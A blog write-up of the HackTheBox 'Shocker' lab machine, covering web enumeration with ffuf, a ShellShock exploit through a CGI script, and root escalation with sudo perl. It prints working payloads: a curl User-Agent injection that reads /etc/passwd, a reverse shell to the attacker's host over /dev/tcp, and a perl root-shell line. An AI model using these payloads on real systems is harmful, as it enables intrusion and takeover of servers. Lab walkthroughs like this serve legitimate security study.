---
title: "Shocker Write-Up"
date: 2025-08-06T19:15:54-05:00
draft: false
author: Jarpiano
tags:
    - Writeup
image: /images/shocker-banner.png
description:
toc:
center: true
---
# Shocker (Easy) Box
The Shocker box is an easy machine on HTB. It explores web enumeration and the ShellShock exploit.

## Initial Foothold

Let's do an NMAP scan of the server:

```bash
nmap <TARGET-IP>
```

Port 80 and Port 2222 seem to be open. A service scan on both port shows us that port 2222 is simply running an SSH service. Since we know that we're dealing with the ShellShock exploit, we'll set our sights on the webserver on port 80.

We can find a bunch of information on the service online. I like this [PDF](https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?ref=benheater.com) in particular. What we want to find is a `cgi` or `Common Gateway Interface` script. Typically these are found in the `/cgi-bin/` directory. If we change our `URL` to:

```url
http://<TARGET-IP>/cgi-bin
```

We should get a forbidden error.

<img src="/images/shocker-image1.png" width="900" alt="Preview Image" />
<br>
<br>

Our script is likely in this directory. The next step takes a while. Now we need to find the actual script. I spent a great deal of time working with several wordlists here. There were several online `cgi` wordlists, but honestly I can't recall any of them working in this case. We should stick to more general enumeration.

We could use `dirbuster`, `gobuster`, or any other enumeration tool. The best in speed and simplicity, in my opinion, is `ffuf`. For wordlists, I suggest using the `directory-2.3-medium` file from `SecLists` or `dirb's big.txt` file. For our extensions, we can use `SecList`'s `web-extensions.txt` file (might have `common` in the name), but `dirb` has it's own smaller version. Any combination of these wordlists work together.

Here is an example command that we can use. But before that, let's get our extensions with:

```bash
ext=$(cat /usr/share/dirb/wordlists/extensions_common.txt)
```

Now we can try:

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt:FUZZ -u http://<MY-IP>/cgi-bin/FUZZ -e $ext
```

This will take some time, but eventually we should get the `/cgi-bin/user.sh`. This was the only page in the `cgi-bin` directory that had a status 200. Going to the URL on a browser seems to give us some output as well.

I attempted to use a Metasploit payload here, but didn't get it to work. I was able to narrow down the issue here. The payload likely edited the User agent and only produced results that were status 500s. Fortunately, I found this [script](https://github.com/Jsmoreira02/CVE-2014-6271) online that had some manual test cases. This one in particular worked:

```bash
sudo curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" <WEBSERVER-IP>
```

By replacing the `/bin/cat /etc/passwd` payload with a reverse shell payload from [RevShells](https://www.revshells.com/) , we can connect via reverse shell as the shelly user. Just set up the listener:

```bash
nc -lvnp 1234
```

Then we can launch a shell with:

```bash
sudo curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -c 'sh -i >& /dev/tcp/<MY-IP>/1234 0>&1';" http://<TARGET-IP>/cgi-bin/user.sh
```

<img src="/images/shocker-image2.png" width="900" alt="Preview Image" />
<br>
<br>

## Privilege Escalation

Once we're on here, I tried a bunch of escalation vectors for the vulnerable Sudo version. Turns out, when you execute:

```bash
sudo -l
```

The `/usr/bin/perl` command is available to run as root. On GTFOBins, we can find a useful escalation line. Let's adjust it to our purposes:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

If we type `whoami`, we can see that we are `root`. We can now access both the `root.txt` and `user.txt` files.

**Fin.**